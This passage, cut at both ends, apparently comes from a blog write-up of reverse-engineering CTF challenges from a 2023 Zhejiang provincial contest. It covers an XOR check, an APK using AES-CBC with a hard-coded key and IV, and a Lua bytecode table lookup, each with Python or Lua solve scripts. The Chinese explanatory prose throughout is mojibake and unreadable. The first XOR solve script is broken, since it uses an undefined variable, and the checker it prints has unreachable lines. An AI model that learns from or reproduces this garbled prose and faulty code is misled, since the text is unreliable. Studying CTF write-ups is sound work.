class="hljs-number">80</span>,<br>    <span class="hljs-number">120</span>,<br>    <span class="hljs-number">112</span>,<br>    <span class="hljs-number">98</span>,<br>    <span class="hljs-number">39</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">52</span>,<br>    <span class="hljs-number">55</span>,<br>    <span class="hljs-number">106</span>]<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-number">24</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>        <span class="hljs-keyword">if</span> check[i] == <span class="hljs-built_in">ord</span>(a[i]) ^ i:<br>            <span class="hljs-keyword">continue</span><br>            <span class="hljs-built_in">print</span>(yes)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br>    <span class="hljs-keyword">continue</span><br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;nononono&#x27;</span>)<br></code></pre></td></tr></table></figure><p>ä¸€æ­¥å¼‚æˆ–</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094000570-d158cf6e-383d-40e1-844f-1b0160bd7373.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s=[<span class="hljs-number">0x34</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xC3</span>,<br><span class="hljs-number">0xC9</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xCD</span>]<br>s1=[<span class="hljs-number">0x71</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x54</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x60</span>,<br>  <span class="hljs-number">0x60</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x22</span>]<br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>    flag+=<span class="hljs-built_in">chr</span>(i^j)<br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç”¨pycdc</p><h2 id="Easyapk"><a href="#Easyapk" class="headerlink" title="Easyapk"></a>Easyapk</h2><p>ç”¨jadxæ‰“å¼€ï¼Œçœ‹åˆ°des.encryptï¼Œå¹¶å‘ç°keyå’Œiv</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094094907-3b917520-bea0-473b-ab53-f3f9ab60d970.png" class=""><p>æ‰¾åˆ°des.encryptï¼Œå®é™…ä¸Šæ˜¯aesï¼Œè¿˜å‘ç°æ˜¯PKCS5å¡«å……æ–¹å¼</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094126080-b68c99b2-82b4-4453-9b3e-200f480dbc4a.png" class="" title="img"><p>çœ‹å¸ˆå‚…çš„wpä¹Ÿèƒ½è§£ï¼Œå¿˜è®°returnçš„æ—¶å€™æœ‰base64åŠ å¯†äº†</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699110382560-07a6ddd3-82ba-4c77-8aed-386a3ce446b9.png" class="" title="img"><p>è®©gptå†™aesè§£å¯†è„šæœ¬</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094208014-7f6bbc22-1643-4d5e-9deb-d0d6ed6862e9.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> unpad<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_decrypt</span>(<span class="hljs-params">ciphertext, iv, key</span>):<br>    <span class="hljs-comment"># è§£ç å¯†æ–‡å’ŒIV</span><br>    ciphertext = base64.b64decode(ciphertext)<br>    iv = <span class="hljs-built_in">bytes</span>.fromhex(iv)<br><br>    <span class="hljs-comment"># åˆ›å»ºAESè§£å¯†å™¨å¯¹è±¡</span><br>    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)<br><br>    <span class="hljs-comment"># è§£å¯†å¯†æ–‡å¹¶å»é™¤å¡«å……</span><br>    plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)<br><br>    <span class="hljs-keyword">return</span> plaintext.decode()<br><br>ciphertext = <span class="hljs-string">&quot;HPjVMiy4FxSPc1n0eq52t4jaZ7FNr/qvJMjkusqbG6t8IVzztqflA0VQmVZYgiaC&quot;</span><br>iv = <span class="hljs-string">&quot;30313233343536373839414243444546&quot;</span><br>key = <span class="hljs-string">&quot;r3v3rs3car3fully&quot;</span><br><br>decrypted_text = aes_decrypt(ciphertext, iv, key)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è§£å¯†ç»“æœï¼š&quot;</span>, decrypted_text)<br></code></pre></td></tr></table></figure><p>æˆ–è€…åœ¨çº¿ï¼Œå·¥å…·é‡Œé¢åªæœ‰PKCS7ï¼Œä½†æ˜¯å¯¹çš„</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094280010-477531fb-dd08-48b5-918b-768543986cae.png" class="" title="img"><h2 id="luare-1"><a href="#luare-1" class="headerlink" title="luare-1"></a>luare-1</h2><p>luaè¯­è¨€</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094745309-705a48fd-ebd7-46ad-bf93-487a4b9466c8.png" class="" title="img"><p>æ‰¾åˆ°ä¸€æ®µåƒå¯†æ–‡çš„</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699094713714-ef6ad1cd-f629-48c6-b16f-5bd9ed1d7ae4.png" class="" title="img"><p>ç‚¹å¼€ç”±0å’ŒOç»„æˆçš„å‡½æ•°ï¼Œçœ‹åˆ°ä¸€å †æ•°æ®ï¼Œä½†æ˜¯æ²¡æ³•å¤„ç†</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699095598106-7e1b7e05-0958-4b4e-ab9f-cc8b03fcff1b.png" class="" title="img"><p>lua_pushcclosureï¼šå°† C å‡½æ•° Oo00Oo0 å‹å…¥ Lua æ ˆä¸­ï¼Œä½œä¸ºä¸€ä¸ªé—­åŒ…ï¼ˆClosureï¼‰ï¼Œå¹¶ä¸”æ²¡æœ‰é™„åŠ çš„ upvaluesï¼ˆç¬¬ 3 ä¸ªå‚æ•°ä¸º 0ï¼‰</p><p>lua_setglobalï¼šå°†æ ˆé¡¶çš„é—­åŒ…è®¾ä¸ºå…¨å±€å˜é‡ Oo00Oo0ï¼Œä½¿å…¶å¯ä»¥åœ¨ Lua ä¸­é€šè¿‡è¿™ä¸ªåå­—è°ƒç”¨</p><p>åœ¨bufå¤„æ‰“ä¸‹æ–­ç‚¹,å¯¼å‡ºluaçš„å­—èŠ‚ç </p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699150981692-ea0ced65-aea2-44d4-90bd-7acdf5d2372e.png" class="" title="img"><p>æˆ‘å°±è¯´å½“æ—¶çœ‹åˆ°è¿™ä¸ªæ€ä¹ˆè¿™ä¹ˆæ€ª</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699150944479-5355c1cd-a727-437d-a7eb-59ca1f65b5f4.png" class="" title="img"><p>ä¸æƒ³åŠ¨è°ƒä¹Ÿå¯ä»¥ç›´æ¥æ”¹æ–‡ä»¶å¤´</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699164343430-1e23c9a9-22eb-4aee-9f0b-454d5d6a6f88.png" class="" title="img"><p>å¯¼å‡ºout</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1725891695802-34619a73-c54f-4783-bc85-1867a8023ccf.png" class="" title="img"><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699153714520-84abc540-bfbb-4c2c-9881-05f5a7cc02d0.png" class="" title="img"><p><code>java -jar unluac.jar out &gt; out.lua</code>åç¼–è¯‘å¾—åˆ°luaæ–‡ä»¶</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CheckAns</span><span class="hljs-params">(data)</span></span><br>  <span class="hljs-keyword">if</span> #data ~= <span class="hljs-number">40</span> <span class="hljs-keyword">then</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>  <span class="hljs-keyword">end</span><br>  dataOut = Oo00Oo0(data)<br>  enc = &#123;<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-72</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">-5</span>,<br>    <span class="hljs-number">99</span>,<br>    <span class="hljs-number">-100</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">32</span>,<br>    <span class="hljs-number">-76</span>,<br>    <span class="hljs-number">109</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">59</span>,<br>    <span class="hljs-number">20</span>,<br>    <span class="hljs-number">-61</span>,<br>    <span class="hljs-number">-56</span>,<br>    <span class="hljs-number">-119</span>,<br>    <span class="hljs-number">48</span>,<br>    <span class="hljs-number">100</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">36</span>,<br>    <span class="hljs-number">118</span>,<br>    <span class="hljs-number">82</span>,<br>    <span class="hljs-number">3</span>,<br>    <span class="hljs-number">95</span>,<br>    <span class="hljs-number">106</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">-80</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">-89</span>,<br>    <span class="hljs-number">89</span>,<br>    <span class="hljs-number">-85</span>,<br>    <span class="hljs-number">5</span>,<br>    <span class="hljs-number">14</span>,<br>    <span class="hljs-number">46</span>,<br>    <span class="hljs-number">-73</span>,<br>    <span class="hljs-number">7</span>,<br>    <span class="hljs-number">127</span><br>  &#125;<br>  i = <span class="hljs-number">1</span><br>  <span class="hljs-keyword">while</span> i &lt;= #dataOut <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> dataOut[i] ~= enc[i] <span class="hljs-keyword">then</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>    <span class="hljs-keyword">end</span><br>    i = i + <span class="hljs-number">1</span><br>  <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br><span class="hljs-keyword">end</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;input: &quot;</span>)<br><span class="hljs-keyword">local</span> data = <span class="hljs-built_in">io</span>.<span class="hljs-built_in">read</span>()<br><span class="hljs-keyword">if</span> CheckAns(data) <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;true&quot;</span>)<br><span class="hljs-keyword">else</span><br>  <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;false&quot;</span>)<br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>ä¸€å‰ä¸€åä¸¤ä¸ªv5å¾—åˆ°v7çš„ä¸‹æ ‡</p><img src="/2023/11/06/%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B2023%E5%88%9D%E8%B5%9Bwp/1699156552052-6bc723bc-61b8-40d9-859d-a284fdc448d5.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python">enc = [<span class="hljs-number">109</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">72</span>, <span class="hljs-number">46</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">5</span>, <span class="hljs-number">99</span>, -<span class="hljs-number">100</span>, <span class="hljs-number">46</span>, <span class="hljs-number">59</span>, <span class="hljs-number">32</span>, -<span class="hljs-number">76</span>, <span class="hljs-number">109</span>, <span class="hljs-number">3</span>, <span class="hljs-number">59</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">61</span>, -<span class="hljs-number">56</span>, -<span class="hljs-number">119</span>, <span class="hljs-number">48</span>, <span class="hljs-number">100</span>, <span class="hljs-number">118</span>, <span class="hljs-number">36</span>, <span class="hljs-number">118</span>, <span class="hljs-number">82</span>,<br>       <span class="hljs-number">3</span>, <span class="hljs-number">95</span>, <span class="hljs-number">106</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">5</span>, -<span class="hljs-number">89</span>, <span class="hljs-number">89</span>, -<span class="hljs-number">85</span>, <span class="hljs-number">5</span>, <span class="hljs-number">14</span>, <span class="hljs-number">46</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">7</span>, <span class="hljs-number">127</span>]<br>b = [<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xB7</span>,<br>     <span class="hljs-number">0x79</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0xF3</span>,<br>     <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x00</span>,<br>     <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x1A</span>,<br>     <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x54</span>,<br>     <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x88</span>,<br>     <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xE9</span>,<br>     <span class="hljs-number">0xD2</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7A</span>,<br>     <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x1C</span>,<br>     <span class="hljs-number">0x65</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x97</span>,<br>     <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xBD</span>,<br>     <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xF4</span>,<br>     <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0xE2</span>,<br>     <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xF1</span>]<br><br><span class="hljs-comment"># for i in range(len(enc)):</span><br><span class="hljs-comment">#     if enc[i]&lt;0:</span><br><span class="hljs-comment">#         enc[i]+=256</span><br><span class="hljs-comment">#     print(hex(enc[i]),end=&quot;,&quot;)</span><br>enc1=[<span class="hljs-number">0x6d</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0xfb</span>,<span class="hljs-number">0x63</span>,<span class="hljs-number">0x9c</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0xb4</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x3b</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x30</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x52</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x5f</span>,<span class="hljs-number">0x6a</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">0xb0</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0xa7</span>,<span class="hljs-number">0x59</span>,<span class="hljs-number">0xab</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">0x2e</span>,<span class="hljs-number">0xb7</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x7f</span>]<br>flag=<span class="hljs-string">&#x27;DA&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">len</span>(enc)-<span class="hljs-number">1</span>):<br>    flag+=<span class="hljs-built_in">chr</span>(b.index(enc1[i])^<span class="hljs-built_in">ord</span>(flag[-<span class="hljs-number">1</span>:]))<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-keyword">import</span> ctypes<br><br>enc = [<span class="hljs-number">109</span>, -<span class="hljs-number">73</span>, -<span class="hljs-number">72</span>, 